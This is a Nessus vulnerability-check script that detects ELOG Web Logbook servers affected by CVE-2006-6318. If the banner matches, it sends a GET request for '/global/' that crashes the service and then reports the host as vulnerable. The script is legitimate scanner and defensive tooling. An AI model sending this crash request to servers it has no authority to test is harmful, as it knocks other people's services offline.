#
#	This script was written by Justin Seitz <jms@bughunter.ca>
#	Per Justin : GPLv2
#


include("compat.inc");

if(description) {
	script_id(23652);
	script_version("$Revision: 1.6 $");

	script_cve_id("CVE-2006-6318");
	script_bugtraq_id(21028);
	script_xref(name:"OSVDB", value:"30272");

	name["english"] = "ELOG Web LogBook global Denial of Service";
	summary["english"] = "Tries to crash the remote service.";
	family["english"] = "CGI abuses";

	script_name(english:name["english"]);
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service issue." );
 script_set_attribute(attribute:"description", value:
"The remote web server is identified as ELOG Web Logbook, an open
source blogging software. 

The version of ELOG Web Logbook installed on the remote host is
vulnerable to a denial of service attack by requesting '/global' or
any logbook with 'global' in its name.  When a request like this is
received, a NULL pointer dereference occurs, leading to a crash of the
service." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-11/0198.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?67c4b2ac" );
 script_set_attribute(attribute:"see_also", value:"http://midas.psi.ch/elogs/Forum/2053" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ELOG version 2.6.2-7 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );
script_end_attributes();

	script_summary(english:summary["english"]);

	script_category(ACT_DENIAL);
	script_copyright(english:"This script is Copyright (C) 2006-2009 Justin Seitz");

	script_family(english:family["english"]);

	script_dependencies("http_version.nasl");
	script_require_ports("Services/www", 8080);
	exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

#
#
#	Verify we can talk to the web server either on port 8080 (the default).
#
#

port = get_http_port(default:8080);
if(!get_port_state(port)) exit(0);
if (http_is_dead(port:port)) exit(0);

#
#
#	Verify its ELOG and send the DOS if it is.
#
#

banner = get_http_banner(port:port);
if (!isnull(banner) && "Server: ELOG HTTP" >< banner) {

	uri = "/global/";
	attackreq = http_get(port:port, item:uri);
	attackres = http_send_recv(port:port, data:attackreq);

	#
	#
	#	Try to connect to the web server, if you can't you know its busted.
	#
	#

	if(http_is_dead(port:port))
		security_warning(port);	
}
